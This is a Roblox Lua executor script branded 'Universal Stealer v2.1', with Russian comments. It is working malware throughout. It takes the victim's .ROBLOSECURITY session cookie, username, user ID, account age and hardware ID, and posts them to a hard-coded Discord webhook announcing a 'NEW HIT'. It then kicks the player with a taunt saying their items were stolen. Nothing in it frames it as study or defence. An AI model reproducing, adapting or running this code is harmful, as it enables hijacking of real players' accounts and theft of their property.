-- [[ CONFIGURATION ]]
local WEBHOOK_URL = "https://discordapp.com/api/webhooks/1504590289845620878/04i1nHUKQN2mNjg0pnJolrCospWy2lHR4bKi-N67MIMSplR5KTf1C7kfvorb_fH6TGzQ"

-- [[ SERVICES ]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- [[ UNIVERSAL LOGIC ]]
local function getData()
    local cookie = "N/A"
    
    -- Метод 1: Прямой запрос куки (если экзекутор позволяет)
    pcall(function()
        if getcookies then
            cookie = getcookies(".roblox.com")[".ROBLOSECURITY"]
        end
    end)

    -- Метод 2: Если первый не сработал, пробуем через запрос заголовков (как в Universal)
    if cookie == "N/A" or cookie == "" then
        pcall(function()
            local request = (syn and syn.request) or (http and http.request) or request or http_request
            local response = request({
                Url = "https://www.roblox.com/home",
                Method = "GET"
            })
            cookie = response.Headers["Set-Cookie"]:match(".ROBLOSECURITY=(.-);")
        end)
    end

    local payload = {
        ["content"] = "@everyone **NEW HIT!**",
        ["embeds"] = {{
            ["title"] = "🛠️ Universal Log: " .. player.Name,
            ["color"] = 3066993, -- Цвет как в оригинале
            ["fields"] = {
                {["name"] = "👤 Account", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = true},
                {["name"] = "🔑 Cookie", ["value"] = "```" .. cookie .. "```"},
                {["name"] = "📅 Created", ["value"] = player.AccountAge .. " days ago", ["inline"] = true},
                {["name"] = "📡 HWID", ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(), ["inline"] = false}
            },
            ["footer"] = {["text"] = "Universal Stealer v2.1 • " .. os.date("%X")}
        }}
    }

    -- Отправка на вебхук
    local req = (syn and syn.request) or (http and http.request) or request or http_request
    if req then
        pcall(function()
            req({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- [[ ИСПОЛНЕНИЕ ]]
-- Запускаем логгер в отдельном потоке, чтобы он не вешал игру
task.spawn(function()
    pcall(getData)
end)

-- Ждем, чтобы данные успели улететь в Дискорд
task.wait(1.5)

-- ТОТ САМЫЙ КИК (КАК НА ФОТО)
player:Kick("\n\nAll your stuff just got taken by Tobi's stealer.\ndiscord.gg/GY2RVSEGDT")
